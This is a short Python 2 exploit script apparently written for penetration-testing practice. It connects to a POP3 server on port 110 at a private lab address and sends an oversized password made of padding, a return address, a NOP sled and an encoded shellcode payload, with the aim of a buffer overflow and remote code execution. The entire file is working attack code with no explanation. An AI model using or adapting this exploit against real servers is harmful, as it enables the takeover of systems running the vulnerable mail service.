#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

exploit = ("\xdd\xc3\xd9\x74\x24\xf4\x5d\x2b\xc9\xbf\xa0\xb0\xa5\xbb\xb1"
"\x52\x31\x7d\x17\x83\xc5\x04\x03\xdd\xa3\x47\x4e\xe1\x2c\x05"
"\xb1\x19\xad\x6a\x3b\xfc\x9c\xaa\x5f\x75\x8e\x1a\x2b\xdb\x23"
"\xd0\x79\xcf\xb0\x94\x55\xe0\x71\x12\x80\xcf\x82\x0f\xf0\x4e"
"\x01\x52\x25\xb0\x38\x9d\x38\xb1\x7d\xc0\xb1\xe3\xd6\x8e\x64"
"\x13\x52\xda\xb4\x98\x28\xca\xbc\x7d\xf8\xed\xed\xd0\x72\xb4"
"\x2d\xd3\x57\xcc\x67\xcb\xb4\xe9\x3e\x60\x0e\x85\xc0\xa0\x5e"
"\x66\x6e\x8d\x6e\x95\x6e\xca\x49\x46\x05\x22\xaa\xfb\x1e\xf1"
"\xd0\x27\xaa\xe1\x73\xa3\x0c\xcd\x82\x60\xca\x86\x89\xcd\x98"
"\xc0\x8d\xd0\x4d\x7b\xa9\x59\x70\xab\x3b\x19\x57\x6f\x67\xf9"
"\xf6\x36\xcd\xac\x07\x28\xae\x11\xa2\x23\x43\x45\xdf\x6e\x0c"
"\xaa\xd2\x90\xcc\xa4\x65\xe3\xfe\x6b\xde\x6b\xb3\xe4\xf8\x6c"
"\xb4\xde\xbd\xe2\x4b\xe1\xbd\x2b\x88\xb5\xed\x43\x39\xb6\x65"
"\x93\xc6\x63\x29\xc3\x68\xdc\x8a\xb3\xc8\x8c\x62\xd9\xc6\xf3"
"\x93\xe2\x0c\x9c\x3e\x19\xc7\xa9\xb5\x21\x9d\xc6\xcb\x21\xa0"
"\xad\x45\xc7\xc8\xc1\x03\x50\x65\x7b\x0e\x2a\x14\x84\x84\x57"
"\x16\x0e\x2b\xa8\xd9\xe7\x46\xba\x8e\x07\x1d\xe0\x19\x17\x8b"
"\x8c\xc6\x8a\x50\x4c\x80\xb6\xce\x1b\xc5\x09\x07\xc9\xfb\x30"
"\xb1\xef\x01\xa4\xfa\xab\xdd\x15\x04\x32\x93\x22\x22\x24\x6d"
"\xaa\x6e\x10\x21\xfd\x38\xce\x87\x57\x8b\xb8\x51\x0b\x45\x2c"
"\x27\x67\x56\x2a\x28\xa2\x20\xd2\x99\x1b\x75\xed\x16\xcc\x71"
"\x96\x4a\x6c\x7d\x4d\xcf\x9c\x34\xcf\x66\x35\x91\x9a\x3a\x58"
"\x22\x71\x78\x65\xa1\x73\x01\x92\xb9\xf6\x04\xde\x7d\xeb\x74"
"\x4f\xe8\x0b\x2a\x70\x39")

buffer = 'A'*2606 + '\x8f\x35\x4a\x5f' + '\x90' * 16 + exploit + 'C'*(2700-2606-4-16-351)

try:
	print "\n sending evil buffer..."
	s.connect(('10.11.5.115', 110))
	data = s.recv(1024)
	s.send('USER test\r\n')
	data = s.recv(1024)
	s.send('PASS '+buffer+'\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP3!"
